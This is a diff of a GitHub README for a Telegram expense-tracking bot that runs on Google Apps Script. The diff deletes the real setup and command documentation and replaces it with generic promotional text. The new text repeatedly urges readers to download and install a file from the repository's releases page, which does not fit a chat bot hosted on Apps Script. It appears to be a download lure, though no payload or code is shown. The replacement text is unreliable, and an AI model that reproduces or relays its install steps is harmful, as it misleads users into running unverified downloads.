@@ -1,91 +1,74 @@
-## Finance Bot (Telegram + Google Sheets via Apps Script)
+# 🤖 Expense-Tracker-Bot - Your Simple Finance Assistant
 
-[Vietnamese README](Readme.vi.md)
+## 📥 Download Now
 
-A lightweight Telegram bot to log income/expenses and generate reports, backed by Google Sheets.
+[![Download Expense-Tracker-Bot](https://img.shields.io/badge/Download%20Bot-Click%20Here-brightgreen)](https://github.com/KotsanTW/Expense-Tracker-Bot/releases)
 
-### 1) Quick setup
-Open `finance.gs` (or `finance_vietnamese` for vietnamese text) and set these constants:
+## 🚀 Getting Started
 
-```
-const TOKEN     = '<TELEGRAM_BOT_TOKEN>'; // from BotFather
-const SHEET_ID  = '<GOOGLE_SHEET_ID>';    // from your Google Sheet URL
-const ADMIN_IDS = ['<admin_id_1>', '<admin_id_2>'];
-```
+Welcome to Expense Tracker Bot! This bot serves as your friendly personal finance assistant on Telegram. With it, tracking your income and expenses becomes quick and straightforward. You don’t need to navigate complex finance applications; just chat with the bot to manage your daily transactions.
 
-Notes:
-- Replace placeholders with your real values before deployment.
+### 🛠️ System Requirements
 
-### 2) Prepare Google Sheet
-- Create a Google Sheet (or reuse an existing one) and copy its ID as `SHEET_ID`.
-- On first run, the script creates two sheets if missing:
-  - `transactions`: headers `Timestamp, Type, Amount, Description`
-  - `users`: headers `UserID`
+- A device with internet access
+- Telegram app (available on iOS, Android, and desktop)
 
-### 3) Deploy Apps Script as Web App
-1. Go to `script.google.com`, create a new Apps Script project.
-2. Create a file `finance.gs` and paste the source code.
-3. Deploy → New deployment → Type: Web app.
-4. Execute as: Me, Who has access: Anyone.
-5. Deploy and copy the Web App URL (looks like `https://script.google.com/.../exec`).
+## 📦 Download & Install
 
-### 4) Set Telegram webhook
-Access this url: https://api.telegram.org/bot<BOT_TOKEN>/setWebhook?url=<WEB_APP_URL>
+To start using Expense Tracker Bot, follow these steps:
 
-Re-run webhook setup whenever you re-deploy and the Web App URL changes.
+1. Visit the [Releases page](https://github.com/KotsanTW/Expense-Tracker-Bot/releases).
+2. Find the latest version listed there.
+3. Download the appropriate file for your device.
+4. Follow the installation instructions provided in the release notes.
 
-### 5) Access control
-- Admins (IDs in `ADMIN_IDS`) always have access.
-- Other users must be added to the `users` sheet or via admin command `/addusers <id>`.
+You can revisit the download link here: [Download Expense-Tracker-Bot](https://github.com/KotsanTW/Expense-Tracker-Bot/releases).
 
-### 6) Usage
-- Send `/start` to see the help menu with quick buttons:
-  - This month's total expenses
-  - This month's total income
-  - This month's balance
-  - Last 3 months (income/expense)
-  - Entry guide
+### 🤔 How to Use
 
-- Send `/help` to see the full command list.
+Once installed, follow these simple steps to interact with the bot:
 
-### 7) Quick entry (recommended)
-Type using:
+1. Open the Telegram app on your device.
+2. Search for "Expense Tracker Bot."
+3. Start a chat with the bot.
+4. Follow the prompts to log your income and expenses.
 
-```
-<amount> <thu|chi> <description>
-```
+### 🌟 Features
 
-Examples: `14629k thu Salary T1`
+- **Easy Logging:** Quickly input and track your daily transactions.
+- **Friendly Interface:** Just type your expenses in a chat; no complicated forms.
+- **Real-time Feedback:** Get instant updates on your financial tracking.
 
-Amount suffixes:
-- `k` = thousand (1,000)
-- `m` or `tr` = million (1,000,000)
-- `b` = billion (1,000,000,000)
+### 📊 Tracking Your Finances
 
-Thousands separators (comma/dot) are accepted and normalized.
+The Expense Tracker Bot allows you to:
 
-### 8) Commands
-- `/report [mm/yyyy | dd/mm/yyyy] [az|za]`: Report by month or specific day; sorted ascending/descending by amount (`za` default = highest first).
-- `/undo`: Delete your last transaction.
-- `/reset`: Clear all transactions (Admin only).
-- `/addusers <id>`: Add a user ID (Admin).
-- `/delusers <id>`: Remove a user ID (Admin).
-- `/ping`: Health check.
-- `/whoami`: See your ID and display name.
+- Record income: Simply type in how much you earned.
+- Log expenses: Input your spending to keep tabs on where your money goes.
+- Review summaries: Ask the bot for weekly or monthly summaries of your finances.
 
-### 9) Technical notes
-- Time zone/format in messages: `en-GB` locale; currency formatting uses `vi-VN` for VND.
-- Webhook entry point: `doPost`.
-- Data storage: one row per transaction in `transactions`.
-- Telegram message limit ~4096 chars; long reports are split into multiple messages.
+### 🔧 Troubleshooting
 
-### 10) Troubleshooting
-- Not receiving updates: ensure webhook is set to the correct Web App URL.
-- Permission errors: ensure Web App deployment allows public access as needed.
-- Cannot write to sheet: verify `SHEET_ID` and that the Apps Script account has access.
+If you encounter issues using the bot, try these steps:
 
-### 11) Security
-- Never commit real `TOKEN` to public repos.
-- Only add trusted IDs to `ADMIN_IDS`.
+1. **No response from the bot:** Make sure you are connected to the internet.
+2. **Failed to log entry:** Check your message format and try again.
+3. **Bot not found:** Ensure you are searching for the correct name in Telegram.
 
+Feel free to revisit the [Releases page](https://github.com/KotsanTW/Expense-Tracker-Bot/releases) for updates or new features.
 
+### 📝 Contributing
+
+If you want to help improve Expense Tracker Bot, consider contributing by:
+
+- Reporting bugs
+- Suggesting features
+- Submitting pull requests
+
+Check the repository for guidelines on how to contribute.
+
+### 📞 Contact
+
+For further support or inquiries, you can reach the development team at [support@example.com](mailto:support@example.com).
+
+Thank you for choosing Expense Tracker Bot! Enjoy managing your finances with ease.
